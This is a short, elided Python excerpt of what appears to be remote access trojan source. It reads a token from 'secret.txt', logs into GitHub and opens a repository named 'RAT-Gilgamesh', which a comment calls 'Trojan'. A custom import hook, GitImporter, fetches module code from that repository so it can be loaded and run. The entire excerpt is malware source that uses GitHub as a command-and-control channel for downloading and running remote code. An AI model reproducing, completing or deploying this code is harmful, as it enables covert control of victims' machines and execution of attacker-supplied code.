...
def github_connect():
    ...
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'Xeronis'  # GitHub username
    sess = github3.login(token=token)  # Login to GitHub using the token
    return sess.repository(user, 'RAT-Gilgamesh')  # Return the specific repository 'Trojan'
...
class GitImporter:
    ...
    def find_spec(self, fullname, path, target=None):
        ...
        try:
            ...
            new_library = get_file_contents('module', f'{fullname}.py', self.repo)
